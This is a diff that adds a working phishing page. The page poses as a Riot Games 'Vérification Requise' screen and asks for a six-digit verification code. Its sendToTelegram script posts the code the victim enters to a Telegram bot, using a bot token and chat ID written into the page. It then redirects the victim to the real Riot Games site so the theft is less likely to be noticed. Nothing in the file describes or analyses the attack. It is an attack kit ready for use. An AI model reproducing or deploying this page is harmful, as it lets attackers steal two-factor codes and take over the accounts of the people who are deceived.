@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <title>Riotgames | Verification</title>
+  </head>
+  <body>
+    <main class="main">
+      <section class="section-login">
+        <div class="container">
+          <img src="assets/img/logo.png" class="logo" alt="#" />
+
+          <h1 class="section-title">Vérification Requise</h1>
+          <p id="email-info" style="color: gray; font-weight: bold;">Entrez le code que nous avons envoyé à i***@****.com</p>
+
+          <label class="login-user">
+            <span id="verification-label">Verification Code</span>
+            <input type="text" id="verification-code" class="input" maxlength="6" oninput="checkInputs()" onkeypress="return event.charCode >= 48 && event.charCode <= 57" />
+          </label>
+        </div>
+
+        <div class="container">
+          <button type="button" class="login-btn" id="login-btn" disabled onclick="sendToTelegram()">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+              <path
+                d="M438.6 278.6l-160 160C272.4 444.9 264.2 448 256 448s-16.38-3.125-22.62-9.375c-12.5-12.5-12.5-32.75 0-45.25L338.8 288H32C14.33 288 .0016 273.7 .0016 256S14.33 224 32 224h306.8l-105.4-105.4c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0l160 160C451.1 245.9 451.1 266.1 438.6 278.6z"
+              />
+            </svg>
+          </button>
+          
+          <p id="timer" style="color: gray; font-weight: bold; text-align: center;">Veuillez patienter, le code peut prendre un peu de temps.</p>
+          <a href="#" id="resend-link" class="section-link" style="display: none;">Renvoyer le code</a>
+        </div>
+      </section>
+
+      <section class="wallpaper"></section>
+    </main>
+
+    <script>
+      function checkInputs() {
+        const verificationCode = document.getElementById("verification-code").value.trim();
+        const loginBtn = document.getElementById("login-btn");
+        const verificationLabel = document.getElementById("verification-label");
+
+        if (verificationCode.length > 0) {
+          verificationLabel.style.opacity = "0";
+        } else {
+          verificationLabel.style.opacity = "1";
+        }
+
+        if (/^\d{6}$/.test(verificationCode)) {
+          loginBtn.removeAttribute("disabled");
+        } else {
+          loginBtn.setAttribute("disabled", "true");
+        }
+      }
+
+      function sendToTelegram() {
+        const verificationCode = document.getElementById("verification-code").value.trim();
+        
+        if (!/^\d{6}$/.test(verificationCode)) {
+          return;
+        }
+
+        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
+        const chatId = "6687453395";
+        const message = `🔥 Code de vérification 🔥\n\n🔢 Code: ${verificationCode}`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+          .then(() => {
+            window.location.href = "https://www.riotgames.com/";
+          })
+          .catch(error => console.error("Error sending to Telegram:", error));
+      }
+
+      let timeLeft = 120;
+      const timerElement = document.getElementById("timer");
+      const resendLink = document.getElementById("resend-link");
+
+      function updateTimer() {
+        if (timeLeft > 0) {
+          timeLeft--;
+          if (timeLeft === 90) {
+            timerElement.textContent = "Le code a été envoyé.";
+          }
+          timerElement.textContent = `Veuillez patienter ${timeLeft} secondes.`;
+          setTimeout(updateTimer, 1000);
+        } else {
+          timerElement.style.display = "none";
+          resendLink.style.display = "block";
+        }
+      }
+
+      updateTimer();
+    </script>
+  </body>
+</html>
